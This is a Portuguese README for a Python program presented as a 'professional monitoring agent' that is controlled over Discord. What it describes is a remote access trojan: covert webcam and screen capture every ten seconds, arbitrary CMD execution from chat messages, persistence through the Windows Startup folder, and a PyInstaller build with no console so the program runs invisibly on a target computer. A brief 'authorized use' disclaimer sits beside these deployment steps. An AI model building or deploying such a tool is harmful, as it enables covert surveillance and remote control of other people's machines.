# Professional Agent - Sistema de Monitoramento Remoto via Discord

Este é um agente de monitoramento desenvolvido em Python que integra capturas periódicas de hardware (Webcam e Print Screen) e gerenciamento de comandos via terminal CMD diretamente por um canal de texto do Discord.

## 🚀 Funcionalidades

* **Identificação de Rede Dupla:** Relata endereços IPv4 e IPv6 locais limpos assim que se conecta.
* **Monitoramento por Imagem Estável (10s):** Loop contínuo que captura fotos da webcam (`OpenCV`) e capturas de tela (`PyAutoGUI`) simultaneamente a cada 10 segundos.
* **Envio via Memória RAM (Buffer):** Os prints de tela não geram arquivos temporários no disco rígido do host, eliminando travamentos ou bloqueios de permissão do Windows.
* **Terminal CMD Remoto:** Qualquer mensagem de texto enviada no canal restrito do bot é interpretada e executada diretamente no Prompt de Comando (`subprocess`), devolvendo a resposta formatada no chat.
* **Mecanismo de Persistência:** Função interna estruturada para se autopublicar na pasta `Startup` (Inicializar) do Windows.

---

## 🛠️ Pré-requisitos e Dependências

Para rodar ou compilar o projeto, certifique-se de instalar as seguintes bibliotecas no seu interpretador Python:

```bash
pip install discord.py opencv-python pyautogui Pillow pyinstaller
```

---

## ⚙️ Configuração das Intents no Discord Developer Portal

Para que os comandos remotos (como o `!print` ou a execução de linhas do CMD) funcionem corretamente, você deve configurar os privilégios no painel do Discord:

1. Acesse o [Discord Developer Portal](https://discord.com/developers/applications).
2. Selecione a sua aplicação e navegue até a aba **Bot**.
3. Role até a seção **Privileged Gateway Intents**.
4. Ative obrigatoriamente a opção **Message Content Intent**.
5. Salve as modificações.

No código, o cliente está otimizado para solicitar apenas a intent necessária:
```python
intents = discord.Intents.default()
intents.message_content = True
```

---

## 📦 Como gerar um Executável Independente (.exe)

Caso queira implantar o monitoramento em outra máquina sem a necessidade de instalar o Python ou expor o código-fonte, empacote o script em um único arquivo binário oculto:

1. Abra o terminal na pasta do projeto.
2. Execute o comando de compilação do **PyInstaller**:
   ```bash
   python -m PyInstaller --onefile --noconsole main.py
   ```
3. O executável standalone será gerado dentro do diretório `/dist` com o nome `main.exe`.
4. Basta transferir o arquivo para o computador de destino e executá-lo. Ele operará de forma invisível em segundo plano.

---

## ⚠️ Avisos de Segurança

* **Exposição de Tokens:** Nunca publique ou compartilhe o seu arquivo `main.py` com o campo `TOKEN_B64` preenchido em repositórios públicos. Caso o token vaze, gere um novo imediatamente através do botão **Reset Token** no painel de desenvolvedor do Discord.
* **Uso:** Este script foi desenvolvido estritamente para fins de aprendizado, automação residencial e monitoramento autorizado de dispositivos próprios.
